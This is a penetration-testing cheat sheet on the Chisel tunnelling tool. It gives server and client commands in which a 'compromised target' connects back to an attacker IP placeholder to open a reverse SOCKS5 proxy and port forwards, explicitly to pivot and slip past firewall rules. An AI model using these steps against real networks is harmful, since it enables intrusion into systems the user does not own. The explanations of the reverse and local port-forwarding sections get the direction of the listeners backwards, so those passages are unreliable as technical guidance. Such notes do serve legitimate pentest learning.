# Chisel

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured with SSH. It's a powerful and versatile tool for creating reverse shells, setting up SOCKS proxies for pivoting, and forwarding ports in a highly flexible manner. Chisel is often preferred over standard SSH for its performance, ease of use in certain scenarios, and ability to bypass restrictive firewall rules that might block SSH directly.

{% hint style="info" %}
## Download & Install:

Download the appropriate static binary from the Chisel GitHub releases page for your attacker machine and the target architecture. Transfer the client binary to the target machine.

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
{% endhint %}

## Basic Concepts

* Server Mode: Chisel listens for incoming connections.
* Client Mode: Chisel connects to a Chisel server.

## Common Use Cases

### Setting up a SOCKS5 Proxy for Pivoting

This TCP/UDP tunnel over HTTP is secured via SSH. It employs the client-server architecture for its operation. This technique can be used to bypass firewalls and access resources that are not directly accessible from your local machine.

1.  On your attacker machine (server):

    ```bash
    chisel server --reverse --port 8000
    ```

    This starts a Chisel server on port 8000, allowing a client to connect back and create a reverse tunnel. The `--reverse` flag enables reverse SOCKS proxy support.
2.  On the compromised target (client):

    ```bash
    chisel client [YOUR_ATTACKER_IP]:8000 R:socks
    ```

    The target connects to your attacker machine. `R:socks` tells the client to create a _reverse_ SOCKS proxy. When this connects, a SOCKS5 proxy will be available on your attacker machine's `localhost:1080` (by default, or a random high port if 1080 is in use, check chisel's output).

You can then configure `proxychains` or your browser to use `localhost:1080` as a SOCKS5 proxy to pivot through the compromised machine.

### Reverse Port Forwarding

(Exposing a local service to the target)

1.  On your attacker machine (server):

    ```bash
    chisel server --port 8000
    ```
2.  On the compromised target (client): Suppose you have a local HTTP server on your machine on port 8080 that you want the target to access.

    ```bash
    chisel client [YOUR_ATTACKER_IP]:8000 R:80:localhost:8080
    ```

    This tells the target to open port `80` on its localhost, and any traffic to that port will be forwarded to your attacker machine's `localhost:8080`.

### Local Port Forwarding

(Accessing a target service from your machine)

1.  On your attacker machine (server):

    ```bash
    chisel server --port 8000
    ```
2.  On the compromised target (client): Suppose the target has an internal web server at `192.168.1.50:80`.

    ```bash
    chisel client [YOUR_ATTACKER_IP]:8000 L:8080:192.168.1.50:80
    ```

    This creates a local forward on your attacker machine (where the `chisel server` is running) such that `localhost:8080` will connect to `192.168.1.50:80` through the tunnel.
